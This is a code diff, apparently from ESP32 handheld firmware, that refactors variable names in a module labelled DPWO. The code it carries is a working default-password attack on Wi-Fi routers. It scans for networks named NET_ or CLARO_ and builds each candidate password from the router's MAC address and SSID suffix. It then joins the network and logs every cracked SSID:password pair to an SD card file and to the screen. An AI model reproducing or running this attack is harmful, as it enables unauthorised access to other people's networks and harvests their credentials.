@@ -11,34 +11,34 @@
 
 #define SD_CREDS_PATH "/dpwoCreds.txt"
 
-int apScanned = 0;
+int ap_scanned = 0;
 
-void parseBSSID(char* bssidWithoutColon, const char* bssid) {
+void parse_BSSID(char* bssid_without_colon, const char* bssid) {
   int j = 0;
   for (int i = 0; i < strlen(bssid); ++i) {
     if (bssid[i] != ':') {
-      bssidWithoutColon[j++] = bssid[i];
+      bssid_without_colon[j++] = bssid[i];
     }
   }
-  bssidWithoutColon[j] = '\0'; 
+  bssid_without_colon[j] = '\0'; 
 }
 
-void netAp(int i) {
-  char bssidWithoutColon[18]; 
-  parseBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
+void net_ap(int i) {
+  char bssid_without_colon[18]; 
+  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
   Serial.println("MAC addr");
-  Serial.println(bssidWithoutColon);
+  Serial.println(bssid_without_colon);
   
-  char *bssidReady = bssidWithoutColon + 4; 
-  bssidReady[strlen(bssidReady)-2] = '\0';
-  int ssidLength = WiFi.SSID(i).length();
-  if (ssidLength >= 2) {
-      String lastTwo = WiFi.SSID(i).substring(ssidLength - 2);
-      strcat(bssidReady, lastTwo.c_str());
+  char *bssid_ready = bssid_without_colon + 4; 
+  bssid_ready[strlen(bssid_ready)-2] = '\0';
+  int ssid_length = WiFi.SSID(i).length();
+  if (ssid_length >= 2) {
+      String last_two = WiFi.SSID(i).substring(ssid_length - 2);
+      strcat(bssid_ready, last_two.c_str());
   } else {
       Serial.println("ERROR");
   }
-  WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
+  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
   // TODO: Dont depend on delays and compare the wifi status other way :P
   delay(2000);
   while (WiFi.status() != WL_CONNECTED) {
@@ -49,24 +49,24 @@ void netAp(int i) {
   Serial.println("\nWiFi Connected");
   WiFi.disconnect();
   #if defined(SDCARD)
-  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
+  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
   Serial.println("\nWrote creds to SD");
   #endif
   DISP.setTextSize(TINY_TEXT);
   DISP.setTextColor(GREEN, BGCOLOR);
-  DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
+  DISP.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
 }
 
-void claroAp(int i) {
-  char bssidWithoutColon[18]; 
-  parseBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
+void claro_ap(int i) {
+  char bssid_without_colon[18]; 
+  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
   Serial.println("MAC addr");
-  Serial.println(bssidWithoutColon);
+  Serial.println(bssid_without_colon);
   
-  char *bssidReady = bssidWithoutColon + 4; 
-  bssidReady[strlen(bssidReady)-2] = '\0';
-  int ssidLength = WiFi.SSID(i).length();
-  WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
+  char *bssid_ready = bssid_without_colon + 4; 
+  bssid_ready[strlen(bssid_ready)-2] = '\0';
+  int ssid_length = WiFi.SSID(i).length();
+  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
   delay(2000);
   while (WiFi.status() != WL_CONNECTED) {
     Serial.println("\nNOPE");    
@@ -76,44 +76,43 @@ void claroAp(int i) {
   Serial.println("\nWiFi Connected");
   WiFi.disconnect();
   #if defined(SDCARD)
-  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
-  Serial.println("\nWrote creds to SD");
+    appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
+    Serial.println("\nWrote creds to SD");
   #endif
   DISP.setTextSize(TINY_TEXT);
   DISP.setTextColor(GREEN, BGCOLOR);
-  DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
+  DISP.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
 }
 
 
-void dpwoSetup() {
+void dpwo_setup() {
   Serial.println("Scanning for DPWO...");
   WiFi.mode(WIFI_STA);
-  apScanned = WiFi.scanNetworks();
-  Serial.println(apScanned);
-
+  ap_scanned = WiFi.scanNetworks();
+  Serial.println(ap_scanned);
 
   DISP.setTextColor(FGCOLOR, BGCOLOR);
 
 }
 
-void dpwoLoop(){
-  if (apScanned == 0) {
+void dpwo_loop(){
+  if (ap_scanned == 0) {
     DISP.println("no networks found");
   } else {
 
     //TODO: Add different functions to match Copel and Vivo regex on SSID also
-    std::regex netRegex("NET_.*");
-    std::regex claroRegex("CLARO_.*");
+    std::regex net_regex("NET_.*");
+    std::regex claro_regex("CLARO_.*");
 
 
     //TODO: dont repeat the wifi connection process inside each function, instead work on this loop
 
-    for (int i = 0; i < apScanned; ++i) {
-      if (std::regex_search(WiFi.SSID(i).c_str(), netRegex)) {
-        netAp(i);
+    for (int i = 0; i < ap_scanned; ++i) {
+      if (std::regex_search(WiFi.SSID(i).c_str(), net_regex)) {
+        net_ap(i);
         Serial.println("NET SSID");
-      } else if (std::regex_search(WiFi.SSID(i).c_str(), claroRegex)) {
-        claroAp(i);
+      } else if (std::regex_search(WiFi.SSID(i).c_str(), claro_regex)) {
+        claro_ap(i);
         Serial.println(WiFi.SSID(i));
         Serial.println("CLARO SSID");
       
@@ -129,12 +128,10 @@ void dpwoLoop(){
 
   }
   Serial.println("scanning again");
-  apScanned = WiFi.scanNetworks();
+  ap_scanned = WiFi.scanNetworks();
 
   //TODO: append vulnerable APs and dont repeat the output
   DISP.println("======");
 
 }
-
-
 
